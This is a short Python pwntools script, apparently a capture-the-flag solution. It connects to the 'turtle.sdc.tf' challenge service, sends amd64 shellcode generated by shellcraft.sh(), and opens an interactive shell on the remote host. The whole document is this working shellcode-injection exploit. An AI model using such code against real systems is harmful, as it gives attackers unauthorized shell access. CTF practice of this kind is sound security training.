from pwn import *

context.clear(arch="amd64")
p = remote("turtle.sdc.tf", 1337)

p.recvline()
p.sendline(asm(shellcraft.sh())) # size 48
p.interactive()
